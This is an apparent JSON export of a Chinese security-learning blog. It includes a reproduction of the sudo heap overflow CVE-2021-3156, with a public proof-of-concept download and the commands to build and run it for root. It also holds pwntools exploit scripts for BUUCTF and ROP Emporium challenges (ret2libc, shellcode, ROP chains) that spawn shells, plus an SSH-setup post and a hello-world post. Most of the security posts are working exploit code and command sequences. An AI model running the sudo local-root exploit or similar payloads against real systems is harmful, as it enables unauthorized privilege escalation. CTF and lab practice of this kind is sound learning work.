[{"title":"cve_2001_3156","date":"2021-03-13T07:34:44.000Z","path":"2021/03/13/cve-2001-3156/","text":"Linux sudo权限提升漏洞（CVE-2021-3156）复现漏洞详情2021年01月26日，sudo被披露存在一个基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron Samedit”），可导致本地权限提升。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。 影响范围 Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 测试系统是否易受此漏洞影响： \\1. 以非root用户身份登录系统。 \\2. 运行命令“sudoedit -s /” \\3. 如果出现以“ sudoedit：”开头的错误响应，则系统受到此漏洞影响；如果出现以“ usage：”开头的错误响应，则表示该漏洞已被补丁修复。 漏洞复现环境：ubuntu20.04虚拟机，sudo 1.8.31实现：首先检测是否存在此漏洞 版本符合要求，通过运行命令“sudoedit -s /”检测是否真正存在漏洞 经检测漏洞存在 注：版本符合要求，漏洞不一定存在，如： Poc地址: 1https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz 进入目录并执行 12345cd CVE-2021-3156make./sudo-hax-me-a-sandwich make并运行文件 查看到可用选项，后提升权限./sudo-hax-me-a-sandwich 1 //结尾的1代表第几个选项","link":"","categories":[],"tags":[{"name":"-CVE","slug":"CVE","permalink":"http://example.com/tags/CVE/"}]},{"title":"mark_of_practice","date":"2021-03-13T07:33:44.000Z","path":"2021/03/13/mark-of-practice/","text":"最近在入门堆，但是基础实在有点多，可是不会基础的话又看不懂题，所以堆的题也没怎么搞，只能刷点简单题来水，生活不易啊。 ret2libc：buu ciscn_2019_en_212345678910111213141516171819202122232425262728293031323334353637383940from pwn import *from LibcSearcher import *context.os='linux' context.arch='amd64' context.log_level='debug' p = remote('node3.buuoj.cn',26863)#p = process('./ciscn_2019_en_2')elf = ELF('./ciscn_2019_en_2')puts_plt = elf.plt['puts']puts_got = elf.got['puts']main_addr = 0x400B28#ROPgadget查找ret = 0x00400C84pop_rdi = 0x00400c83 # pop rdi ; retp.sendlineafter('choice!\\n','1')#payload = flat(['\\0', 'a'*0x57, pop_di, puts_got, puts_plt, main_addr])payload = 'a'*0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)p.sendlineafter('encrypted\\n',payload)p.recvline()p.recvline()#puts_addr = u64(r.recv(8))puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\0'))#puts_addr= u64(r.recvline()[:-1].ljust(8, '\\x00'))#print(puts_addr)#print(hex(puts_addr))libc = LibcSearcher('puts', puts_addr)libcbase = puts_addr - libc.dump('puts')sys_addr = libcbase + libc.dump('system')binsh_addr = libcbase + libc.dump('str_bin_sh')p.sendlineafter('choice!\\n','1')#payload = flat(['\\0', 'a'*0x57, ret, pop_di, binsh_addr, sys_addr])payload = 'a'*0x58+ p64(ret)+ p64(pop_rdi)+ p64(binsh_addr)+ p64(sys_addr)p.sendlineafter('encrypted\\n',payload)p.interactive() 水题：bjdctf_2020_babystack12345678910from pwn import*r=remote('node3.buuoj.cn',26025)shell_addr=0x4006e6r.sendline('100')payload='a'*(0x10+8)+p64(shell_addr)r.sendline(payload)r.interactive() [HarekazeCTF2019]baby_rop12345678910111213from pwn import *context(log_level = 'debug', arch = 'i386', os = 'linux')#p = process('./babyrop')p = remote('node3.buuoj.cn',26310)#0x00400683 : pop rdi ; retpop_rdi = 0x00400683sys_addr = 0x004005E3bin_sh_addr = 0x00601048payload = 'a'*0x18 + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)p.sendline(payload)p.interactive() ciscn_2019_n_51234567891011121314151617#coding=utf-8from pwn import *context(os='linux',arch='amd64', log_level = 'debug')#sh = process('./ciscn_2019_n_5')sh = remote('node3.buuoj.cn',25696)elf = ELF('./ciscn_2019_n_5')bss_addr = 0x601080#shellcode =\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"shellcode = asm(shellcraft.sh())#生成64位linuxshellcodepayload = 'a'*0x28 + p64(bss_addr)#栈溢出ret到shellcode执行sh.sendlineafter(\"name\\n\",shellcode)sh.sendlineafter(\"me?\\n\",payload)sh.interactive()","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"problem_blog","date":"2021-03-13T07:32:22.000Z","path":"2021/03/13/problem-blog/","text":"由于本人博客搭在虚拟机上，而虚拟机又经常出事，很不幸，爷碰上了。。。。。。。。。 起因的的图片没了，大概就是我要更新博客，把md文件放上去之后，本地部署毫无问题，上传到远程的时候出事了，让我确认是否有远程仓库，给爷整蒙了。 刚开始以为是ssh的原因，我重新生成，然后把原来的删掉了，然后添加了新的具体过程如下： 1ssh-keygen -t rsa -C \"youremail@example.com\" 在本地生成 .ssh 文件夹，然后复制其中的id_rsa.pub中的内容放到github中setting上的SSH中 这就添加完毕了，然后验证 1ssh -T git@github.com # github地址 如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到： Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access. 看到这个信息说明SSH已配置成功！ 而我的就没有，显示 1Permission denied 很无奈，后来查百度后发现是自己的本机的这个git仓库并没有和这个SSH key 关联上 12ssh-agent bashssh-add \"/home/ubuntu/.ssh/id_rsa\" 回显 1Identity added: /home/ubuntu/.ssh/id_rsa (/home/ubuntu/.ssh/id_rsa) 然后hexo d成功部署","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"problems","slug":"problems","permalink":"http://example.com/tags/problems/"}]},{"title":"第一次讲课","date":"2021-03-13T07:29:16.000Z","path":"2021/03/13/第一次讲课/","text":"pwn入门什么是pwnPwn可以简单概括为软件的漏洞的挖掘和利用（二进制攻防）。 涉及到的知识涉及计算机学科的众多方向，而且大多偏底层。包括不限于，C语言，C++，python，数 据结构，计算机组成原理，操作系统，编译原理，计算机网络等。 linux基础虚拟机：Ubuntu版本不限（但是以后做题的时候会用到不同版本的Ubuntu，具体题目具体分析） 基本命令： ls命令 dir就是 list 的缩写，通过 ls 命令不仅可以查看 linux 文件夹包含的文件，而且可以查看文件权限(包括目录、文件夹、文件权限)查看目录信息等等。 cd 命令cd(changeDirectory) 命令语法： 1cd [目录名] 说明：切换当前目录至 dirName。 mkdir filename创建文件夹。 sudo apt-get install python安装。（只能安装库中有的软件程序） sudo apt-get update sudo apt-get upgrade 安装 git，gdb 12sudo apt-get install git sudo apt-get install gdb pip安装 1sudo apt-get install python3-pip 安装pwntools 1pip3 install pwntools PWN类型栈漏洞，堆漏洞，格式化字符串漏洞，整型漏洞，逻辑漏洞 buuctf 第二排第三个 level0 cat flag system(‘bin/sh’)0x20 ROP Emporiumret2win测偏移cyclic 0x32 cyclic(0x32).find(‘kaaalaaam’) 找到system函数地址 payload1234567891011121314from pwn import *context.log_level='debug'p = process('./ret2win')p = remote('',***)system_addr = 0x0400824payload = 'a'*40+p64(system_addr) #0x20+8p.sendline(payload)p.interactive() splitx64传参方式：当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样 需要bin/sh或者cat flag 测偏移，详情见上题 使用ROPgadget 1ROPgadget --binary ./split --only'pop|ret' exp1234567891011121314from pwn import *p = process('./split')#elf = ELF('./split')system_addr = 0x00400810#system_addr = elf.symbols['system']cat_flag_addr = 0x00601060pop_rdi_ret = 0x00400883payload = 'A'*40+p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)p.sendline(payload)p.interactive() callmeIDA 启动！2.1字符串分析 IDA_字符串检查 libcallme.so : 之前文件夹里面的libcallme库 callme one/two/three : 可能为libcallme中的函数 usefulFuction 这个函数使得我们可以调用callme one/two/three,并且得知这三个函数分别需要三个参数 2.2 libcallme.so libcallme 果然，三个函数在这里 2.2.1函数分析1.callme_one callme_one 发现它的作用是读取已经加密了的flag.txt 2.callme_two callme_two 发现是利用key1.dat进行一些解密工作 3.callme_three callme_three 和callme_two差不多，也是进行解密工作 2.3分析漏洞点函数 pwnme 是pwnme函数的一个fgets溢出漏洞 同样得到偏移值0x20+8 2.4查看plt表 plt表 得到地址 123callme_one = 0x401850callme_two = 0x401870callme_three = 0x401810 3.开启了NX保护，而且使用了动态链接库，所以3.1思路 使用ROP实现跳转 使用plt表调用函数关于plt表：GOT表和PLT表知识详解 PLT表中的每一项的数据内容都是对应的GOT表中一项的地址这个是固定不变的，到这里大家也知道了PLT表中的数据根本不是函数的真实地址，而是GOT表项的地址 其实在大家进入带有@plt标志的函数时，这个函数其实就是个过渡作用，因为GO表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。 12345678910111213141516171819202122232425from pwn import *context.log_level = 'debug'#context.terminnal = ['gnome-terminal','-e']p = process('./callme')elf = ELF('./callme')#0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; retpppad = 0x00401ab0callme_three = elf.plt['callme_three']callme_two = elf.plt['callme_two']callme_one = elf.plt['callme_one']#gdb.attach(p)payload = 'a' * 40payload += p64(pppad+3)payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_one)payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_two)payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_three)p.recvuntil('&gt;')p.sendline(payload)p.interactive()","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"Hello World","date":"2021-03-13T05:53:10.160Z","path":"2021/03/13/hello-world/","text":"第n次搭建博客终于成功，过去失败的经验告诉我们不要整些花里胡哨的东西，搞个简单点的主题就行，要不然hexo的各种插件会搞死你，网速好的话可能一会就弄完了，像我这种穷b没钱搭梯子，只能慢慢更新。好了希望看到我文章的各位师傅们轻点喷，也希望师傅们万事如意。（狗头保命）。 Startnew world1$ print(&#x27;Hello World!&#x27;)","link":"","categories":[],"tags":[]},{"title":"ROPempire","date":"2020-10-01T17:25:52.000Z","path":"2020/10/02/ROPempire/","text":"##ret2win 12345678910111213from pwn import *p = process('./ret2win')system_addr = 0x0400824pad = 'a'*0x20+'deadbeef'payload = pad+p64(system_addr)p.sendline(payload)p.interactive() ##split考察将字符串通过寄存器存到函数当中，要熟练掌握x86与x64的传参规律. 1234567891011121314from pwn import *p = process('./split')#elf = ELF('./split')system_addr = 0x00400810#system_addr = elf.symbols['system']cat_flag_addr = 0x00601060pop_rdi_ret = 0x00400883pad = 'A'*40payload = pad+p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)p.sendline(payload)p.interactive() ##callme对参数传递的考察 123456789101112131415161718192021222324252627from pwn import *context.log_level = 'debug'p = process('./callme')elf = ELF('./callme')# info# gadgetpppr = 0x0000000000401ab0 # pop rdi ; pop rsi ; pop rdx ; retcallme_three = 0x401810callme_two = 0x401870callme_one = 0x401850# rop1offset = 40payload = '\\0'*offsetpayload += p64(pppr+3)payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_three) # debug()p.recvuntil('&gt;')p.sendline(payload)p.interactive() ##write4考察通过将字符串写入.bss段来将字符串传递给system函数然后getshell，同时考察gadget的选取与对段的理解。 12345678910111213141516171819202122232425from pwn import *context.log_level = 'debug'p = process('./write4')sys_addr = 0x00400810bss_addr = 0x601060mov_r14_r15 = 0x400820pop_r14_r15 = 0x400890pop_rdi = 0x400893payload = 'a'*(0x20+8)payload += p64(pop_r14_r15) #清空寄存器payload += p64(bss_addr) #向r14中写入bss段地址payload += \"/bin/sh\".ljust(8,\"\\x00\") #向r15中写入/bin/sh\\x00payload += p64(mov_r14_r15) #将r15中的字符串写入r14payload += p64(pop_rdi) #清空rdipayload += p64(bss_addr) #向rdi中写入bss中的字符串payload += p64(sys_addr) #rdi向system传参p.recvuntil('&gt;')p.sendline(payload)p.recv()p.interactive() ##badchars 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *p = process('./badchars')elf = ELF('./badchars')context.log_level = 'debug'# gadgetprdi = 0x400b39 p1213 = 0x400b3bm1213 = 0x400b34system = 0x04009E8#system = elf.plt['system']p1415 = 0x400b40x1415 = 0x400b30''' 0x400b30 &lt;usefulGadgets&gt;: xor BYTE PTR [r15],r14b 0x400b33 &lt;usefulGadgets+3&gt;: ret 0x400b34 &lt;usefulGadgets+4&gt;: mov QWORD PTR [r13+0x0],r12 0x400b38 &lt;usefulGadgets+8&gt;: ret 0x400b39 &lt;usefulGadgets+9&gt;: pop rdi=&gt; 0x400b3a &lt;usefulGadgets+10&gt;: ret 0x400b3b &lt;usefulGadgets+11&gt;: pop r12 0x400b3d &lt;usefulGadgets+13&gt;: pop r13 0x400b3f &lt;usefulGadgets+15&gt;: ret 0x400b40 &lt;usefulGadgets+16&gt;: pop r14 0x400b42 &lt;usefulGadgets+18&gt;: pop r15 0x400b44 &lt;usefulGadgets+20&gt;: ret '''# rop1offset = 40payload = 'A'*offset# filtered: bic/ fns# $0 is okay, but use gadget x1415 to get /bin/sh via xor is the goal (too lazy to write exp) payload += p64(p1213) + '$0\\0\\0\\0\\0\\0\\0' + p64(elf.bss()+0x400) + p64(m1213) payload += p64(prdi) + p64(elf.bss()+0x400) + p64(system)# debug()p.recvuntil('&gt;')p.sendline(payload)p.interactive()","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]}]